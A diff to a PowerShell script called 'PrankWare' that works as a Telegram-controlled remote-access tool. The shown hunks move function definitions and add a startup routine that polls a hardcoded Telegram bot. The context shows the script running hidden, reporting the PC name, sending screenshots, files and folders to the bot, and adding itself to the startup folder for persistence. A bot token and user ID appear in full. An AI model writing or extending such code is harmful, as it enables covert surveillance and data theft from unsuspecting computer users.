@@ -46,12 +46,7 @@ if ($env:PS_RUN_HIDDEN -ne "1") {
     exit
 }
 
-
-# Telegram-Controlled PowerShell Script
-$botToken = "7641108006:AAFVWvnrm8MqTLEi9lsi0ZIVuflDW-l_aOg"
-$userId = "5036966807"
-$apiUrl = "https://api.telegram.org/bot$botToken"
-$lastUpdateId = 0
+# --- ALL FUNCTION DEFINITIONS START HERE ---
 
 function Send-TelegramMessage {
     param (
@@ -62,6 +57,10 @@ function Send-TelegramMessage {
         chat_id = $chatId
         text = $message
     } | ConvertTo-Json -Depth 10)
+}
+
+function Get-PCName {
+    return $env:COMPUTERNAME
 }
 
 function Send-TelegramFile {
@@ -168,10 +167,6 @@ function Send-Screenshot {
     catch {
         return $false
     }
-}
-
-function Get-PCName {
-    return $env:COMPUTERNAME
 }
 
 function Send-TelegramFolder {
@@ -353,6 +348,55 @@ ls or dir - List files and folders.
     Send-TelegramMessage -chatId $chatId -message $helpMessage
 }
 
+# --- ALL FUNCTION DEFINITIONS END HERE ---
+
+# Telegram-Controlled PowerShell Script (Global Variables)
+$botToken = "7641108006:AAFVWvnrm8MqTLEi9lsi0ZIVuflDW-l_aOg"
+$userId = "5036966807"
+$apiUrl = "https://api.telegram.org/bot$botToken"
+$lastUpdateId = 0 # Initial default
+# $global:activeSessions = @{} # If using session management
+# $global:currentSession = $null # If using session management
+
+
+# Attempt to clear pending updates by setting lastUpdateId to the latest known update
+try {
+    Write-Host "PrankWare: Checking for pending Telegram commands on startup..."
+    # Get a batch of recent updates to find the latest update_id
+    # A short timeout is used to prevent hanging if Telegram is unresponsive
+    $pendingUpdates = Invoke-RestMethod "$apiUrl/getUpdates?limit=100&timeout=10" 
+    
+    if ($pendingUpdates.ok -and $pendingUpdates.result.Count -gt 0) {
+        # Sort by update_id descending and take the first one (the highest/most recent)
+        $highestUpdateId = ($pendingUpdates.result | Sort-Object update_id -Descending | Select-Object -First 1).update_id
+        
+        # If this highest ID is greater than our current (default 0), update $lastUpdateId
+        if ($highestUpdateId -gt $lastUpdateId) {
+            $lastUpdateId = $highestUpdateId
+            $startupMessage = "PrankWare: Advanced update offset to $($lastUpdateId + 1) to skip $($pendingUpdates.result.Count) old/pending command(s)."
+            Write-Host $startupMessage
+            # Optional: Send-TelegramMessage -chatId $userId -message $startupMessage
+        } else {
+            Write-Host "PrankWare: No new pending commands to skip. Current offset is appropriate."
+        }
+    } elseif ($pendingUpdates.ok) {
+        # API call was successful, but no updates in the result
+        Write-Host "PrankWare: No pending commands found on startup."
+    } else {
+        # API call was not successful (e.g., network issue, bad token)
+        $startupError = "PrankWare: Could not check for pending commands. API Error: $($pendingUpdates.description | Out-String)"
+        Write-Host $startupError
+        # Optional: Send-TelegramMessage -chatId $userId -message $startupError
+    }
+} catch {
+    $exceptionMessage = $_.Exception.Message | Out-String
+    $startupCatchError = "PrankWare: Error during startup check for pending commands: $exceptionMessage. Starting with default offset."
+    Write-Host $startupCatchError
+    # Optional: Send-TelegramMessage -chatId $userId -message $startupCatchError
+}
+
+# Initial "System is running" message, now includes the starting offset for clarity
+# This call is now AFTER Send-TelegramMessage and Get-PCName are defined.
 Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"
 
 # Ensure the script is in startup folder for persistence
